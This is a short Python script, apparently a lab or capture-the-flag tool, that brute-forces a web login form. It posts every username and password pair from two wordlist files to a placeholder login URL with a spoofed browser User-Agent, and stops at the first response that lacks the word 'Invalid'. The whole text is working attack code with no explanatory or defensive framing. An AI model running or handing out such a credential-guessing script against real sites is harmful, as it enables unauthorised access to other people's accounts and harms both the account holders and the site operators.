import requests

url = "http://<>/login"  
username_file = "Names.txt"
password_file = "passwords.txt"

headers = {
    'User-Agent': 'Mozilla/5.0'
}

with open(username_file, 'r') as uf:
    usernames = [u.strip() for u in uf]

with open(password_file, 'r', encoding="latin-1") as pf:
    passwords = [p.strip() for p in pf]

for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data, headers=headers)

        if "Invalid" not in response.text:
            print(f"[+] SUCCESS: {username}:{password}")
            exit()
        else:
            print(f"[-] Failed: {username}:{password}")
